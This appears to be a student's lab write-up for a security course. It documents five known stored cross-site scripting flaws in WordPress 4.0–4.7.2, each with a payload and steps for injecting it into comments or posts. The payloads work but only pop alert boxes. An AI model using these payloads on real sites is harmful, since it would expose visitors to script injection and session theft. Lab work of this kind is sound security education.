# Chenjun_Frank_Liu_Week7_WP_Eploits
This contains a detailed description on how to create Word Press vulnerability exploits.

## Exploit 1:
  1. Summary: 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  2. Vulnarability Type : XSS
  3. Walkthrough:
  ![](https://i.imgur.com/7zN9982.gif)
  
  4. Code: 
  ```
  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>
  ```
  
  5. Description:
     - Go to a Word Press post and locate the comment section.
     - Post the code from 4 into the comment section.
     - Replace <insert 64kb of random data> with any 64kb worth of charatcters. You can use Notepad to help generate those characters.
     - Click "POST COMMENT".

## Exploit 2:
  1. Summary: 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  2. Vulnarability Type : XSS
  3. Walkthrough:
  ![](https://i.imgur.com/6nlr080.gif)
  
  4. Code:
  ```
  <iframe width="560" height="315" src="https://www.youtube.com/embed/kNKu1uNBVkU" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen onload=alert(0123)></iframe>
  ```
  
  5. Description:
     - Post a new post or create a new post on word Press
     - Fill in title section, and place the code from 4 into the "Text" section.
     - Click "Update" or "Publish" tab.
     - Click "View Post".

## Exploit 3:
  1. Summary: 4.1 - Authenticated Stored Cross-Site Scripting (XSS)
  2. Vulnarability Type : XSS
  3. Walkthrough:
  ![](https://i.imgur.com/u9MgHuF.gif)
  
  4. Code:
  ```
  <a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">A very safe link</a>
  ```
  
  5. Description:
     - Post a new post or create a new post on word Press
     - Fill in title section, and place the code from 4 into the "Text" section.
     - Click "Update" or "Publish" tab.
     - Click "View Post".
     - Move cursor to the linked text.

## Exploit 4:
  1. Summary: 4.0 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
  2. Vulnarability Type : XSS
  3. Walkthrough:
  ![](https://i.imgur.com/wSmthE1.gif)
  
  4. Code:
  ```
  <a href="[caption code=">]</a><a title=" onclick=alert('XSS!')  ">A very safe link</a>
  ```
  
  5. Description:
     - Post a new post or create a new post on word Press
     - Fill in title section, and place the code from 4 into the "Text" section.
     - Click "Update" or "Publish" tab.
     - Click "View Post".
     - Move cursor to the linked text and click.
     
## Exploit 5:
  1. Summary: 4.5.1 - Pupload Same Origin Method Execution (SOME)
  2. Vulnarability Type : XSS
  3. Walkthrough:
  ![](https://i.imgur.com/DhYxTEY.gif)
  
  4. Code:
  ```
  <button onclick="fire()">Click</button>
  <script>
  function fire() {
  open('javascript:alert(0123)');
  }
  </script>
  ```

  5. Description:
     - Go to a Word Press post and locate the comment section.
     - Post the code from 4 into the comment section.
     - Click "POST COMMENT".
     - Find the comment and click on the "CLICK" button.
